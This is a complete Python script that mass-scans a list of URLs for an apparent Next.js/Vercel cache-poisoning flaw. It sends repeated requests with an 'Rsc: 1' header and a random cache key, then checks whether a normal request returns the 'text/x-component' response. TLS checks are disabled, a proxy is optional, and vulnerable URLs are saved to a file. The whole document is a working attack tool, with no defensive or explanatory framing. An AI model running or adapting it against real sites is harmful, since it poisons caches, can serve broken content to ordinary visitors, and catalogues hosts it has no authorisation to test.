import requests
import random
import argparse
from urllib.parse import urljoin
from pathlib import Path
import urllib3
import sys

# Suppress only the single InsecureRequestWarning from urllib3 needed
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def generate_random_value():
    return random.randint(10000, 99999)

def send_requests(base_url, random_value, proxy):
    headers = {
        "Rsc": "1"
    }
    
    proxies = {
        "http": proxy,
        "https": proxy
    } if proxy else None

    try:
        for i in range(10):
            url = urljoin(base_url, f"?k={random_value}")
            response = requests.get(url, headers=headers, proxies=proxies, verify=False, timeout=10)
            print(f"\rsending {i+1}/10", end='', flush=True)
    except requests.RequestException as e:
        print(f"\nRequest failed: {e}")
        return None

def check_response(base_url, random_value, proxy):
    proxies = {
        "http": proxy,
        "https": proxy
    } if proxy else None

    check_url = urljoin(base_url, f"?k={random_value}")
    try:
        response = requests.get(check_url, proxies=proxies, verify=False, timeout=10)
        if response.status_code == 200 and response.headers.get('Content-Type') == "text/x-component":
            print(f"\nThe URL {check_url} is valid and returned the content-type 'text/x-component'.")
            return check_url
        else:
            print("\nThe URL is not valid or did not return the content-type 'text/x-component'.")
            return None
    except requests.RequestException as e:
        print(f"\nRequest failed: {e}")
        return None

def save_to_file(url, output_file):
    with open(output_file, 'a') as file:
        file.write(url + '\n')

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Send requests and check response for multiple URLs.")
    parser.add_argument("file", help="File containing the base URLs to send requests to.")
    parser.add_argument("--proxy", default=None, help="Proxy server to use for the requests (e.g., http://proxy.example.com:8080)")

    args = parser.parse_args()

    output_file = 'output-vercel-cache.txt'

    # Read base URLs from the file
    base_url_path = Path(args.file)
    if not base_url_path.is_file():
        print(f"Error: The file {args.file} does not exist.")
        exit(1)

    # Count total number of URLs
    total_urls = sum(1 for line in open(base_url_path))

    # Check if output file exists, create if not
    Path(output_file).touch()

    with open(base_url_path, 'r') as file:
        checked_count = 0
        for line in file:
            checked_count += 1
            base_url = line.strip()
            random_value = generate_random_value()
            send_requests(base_url, random_value, args.proxy)
            valid_url = check_response(base_url, random_value, args.proxy)
            if valid_url:
                save_to_file(valid_url, output_file)
            print(f"\nProgress: {checked_count}/{total_urls} URLs checked.", end="", flush=True)
